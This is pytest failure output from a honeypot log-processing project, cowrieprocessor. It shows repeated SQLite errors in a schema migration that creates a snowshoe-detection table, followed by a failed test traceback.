2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,805:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,808:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,810:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,812:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,817:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,818:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:57,820:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______________________ test_raw_event_computed_columns ________________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_raw_event_computed_column0')

    def test_raw_event_computed_columns(tmp_path) -> None:
        """Computed columns expose session, event type, and timestamp from JSON payloads."""
        engine = _engine_for_tmp(tmp_path)
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/unit/test_schema_migrations.py:47: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566c84a6d0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,400:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,402:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:58,409:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
